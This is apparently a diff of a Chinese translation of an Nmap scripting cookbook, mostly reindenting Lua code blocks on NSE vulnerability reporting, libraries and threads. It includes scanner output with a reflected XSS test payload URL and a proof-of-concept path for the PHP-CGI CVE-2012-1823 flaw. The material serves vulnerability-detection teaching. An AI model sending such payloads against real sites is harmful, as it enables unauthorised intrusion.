+     http://calder0n.com/sillyapp/secret/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
+   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=calder0n.com
+     References:
+       https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+      http://php.net/manual/en/reserved.variables.server.php
+```
 
 ## 它是如何工作的...
 
@@ -1470,54 +1470,54 @@ Nmap 脚本引擎非常适合检测漏洞，因此 Nmap 已经包含了几个利
 1.  加载`vulns`库（Nmap 6.x 格式）：
 
 ```
-    local vulns = require "vulns"
-    ```
+local vulns = require "vulns"
+```
 
 1.  创建`vuln`对象表。特别注意`state`字段：
 
 ```
-    local vuln = { title = "<TITLE GOES HERE>",
-                   state = vulns.STATE.NOT_VULN,
-                 references = {"<URL1>", "URL2"},
-                   description = [[<DESCRIPTION GOES HERE> ]],
-                   IDS = {CVE = "<CVE ID>", BID = "BID ID"},
-                   risk_factor = "High/Medium/Low" }
-    ```
+local vuln = { title = "<TITLE GOES HERE>",
+               state = vulns.STATE.NOT_VULN,
+             references = {"<URL1>", "URL2"},
+               description = [[<DESCRIPTION GOES HERE> ]],
+               IDS = {CVE = "<CVE ID>", BID = "BID ID"},
+               risk_factor = "High/Medium/Low" }
+```
 
 1.  创建报告对象并报告漏洞：
 
 ```
-    local vuln_report = new vulns.Report:new(SCRIPT_NAME, host, port)
-    return vuln_report:make_output(vuln)
-    ```
+local vuln_report = new vulns.Report:new(SCRIPT_NAME, host, port)
+return vuln_report:make_output(vuln)
+```
 
 1.  如果状态设置为指示主机是否易受攻击，Nmap 将包括类似的漏洞报告：
 
 ```
-    PORT   STATE SERVICE REASON
-    80/tcp open  http    syn-ack
-     http-vuln-cve2012-1823:
-       VULNERABLE:
-       PHP-CGI Remote code execution and source code disclosure
-         State: VULNERABLE (Exploitable)
-         IDs:  CVE:2012-1823
-         Description:
-           According to PHP's website, "PHP is a widely-used general-purpose
-           scripting language that is especially suited for Web development and
-           can be embedded into HTML." When PHP is used in a CGI-based setup
-           (such as Apache's mod_cgid), the php-cgi receives a processed query
-           string parameter as command line arguments which allows command-line
-           switches, such as -s, -d or -c to be passed to the php-cgi binary,
-           which can be exploited to disclose source code and obtain arbitrary
-           code execution.
-         Disclosure date: 2012-05-3
-         Extra information:
-           Proof of Concept:/index.php?-s
-         References:
-           http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
-           http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1823
-          http://ompldr.org/vZGxxaQ
-    ```
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+ http-vuln-cve2012-1823:
+   VULNERABLE:
+   PHP-CGI Remote code execution and source code disclosure
+     State: VULNERABLE (Exploitable)
+     IDs:  CVE:2012-1823
+     Description:
+       According to PHP's website, "PHP is a widely-used general-purpose
+       scripting language that is especially suited for Web development and
+       can be embedded into HTML." When PHP is used in a CGI-based setup
+       (such as Apache's mod_cgid), the php-cgi receives a processed query
+       string parameter as command line arguments which allows command-line
+       switches, such as -s, -d or -c to be passed to the php-cgi binary,
+       which can be exploited to disclose source code and obtain arbitrary
+       code execution.
+     Disclosure date: 2012-05-3
+     Extra information:
+       Proof of Concept:/index.php?-s
+     References:
+       http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
+       http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1823
+      http://ompldr.org/vZGxxaQ
+```
 
 ## 工作原理...
 
@@ -1650,28 +1650,28 @@ STATE_MSG = {
 1.  创建一个名为`mylibrary.lua`的新文件，并开始输入您可能需要的所需库：
 
 ```
-    local math = require "math"
-    ```
+local math = require "math"
+```
 
 1.  现在，只需将函数添加到您的库中。我们将创建一个返回经典的`"Hello World!"`消息的函数：
 
 ```
-    function hello_word()
-      return "Hello World!"
-    end
-    ```
+function hello_word()
+  return "Hello World!"
+end
+```
 
 1.  将您的库文件放入`/nselib/`目录中。创建一个新的 NSE 脚本，并在其中添加`require()`调用：
 
 ```
-    local mylibrary = require "mylibrary"
-    ```
+local mylibrary = require "mylibrary"
+```
 
 1.  从脚本内部执行您的方法。如果无法访问该方法，则可能为函数设置了不正确的范围分配：
 
 ```
-    mylibrary.hello_world()
-    ```
+mylibrary.hello_world()
+```
 
 ## 它是如何工作的...
 
@@ -1763,39 +1763,39 @@ NSE 线程建议用于需要并行执行网络操作的脚本。让我们看看�
 1.  要创建一个新的 NSE 线程，使用库`stdnse`中的函数`new_thread()`：
 
 ```
-    local co = stdnse.new_thread(worker_main_function, arg1, arg2, arg3, ...)
-    ```
+local co = stdnse.new_thread(worker_main_function, arg1, arg2, arg3, ...)
+```
 
 1.  为了同步访问网络资源，在对象上创建一个互斥锁：
 
 ```
-    local my_mutex = nmap.mutex(object)
-    ```
+local my_mutex = nmap.mutex(object)
+```
 
 1.  然后，通过`nmap.mutex(object)`返回的函数可以如下锁定：
 
 ```
-    my_mutex("trylock")
-    ```
+my_mutex("trylock")
+```
 
 1.  在完成工作后，应使用函数`"done"`释放它：
 
 ```
-    my_mutex("done")
-    ```
+my_mutex("done")
+```
 
 1.  NSE 支持条件变量，以帮助您同步线程的执行。要创建条件变量，请使用函数`nmap.condvar(object)`：
 
 ```
-    local o = {} 
-    local my_condvar = nmap.condvar(o)
-    ```
+local o = {} 
+local my_condvar = nmap.condvar(o)
+```
 
 1.  之后，您可以等待、信号或广播条件变量：
 
 ```
-    my_condvar("signal")
-    ```
+my_condvar("signal")
+```
 
 ## 它是如何工作的...
 
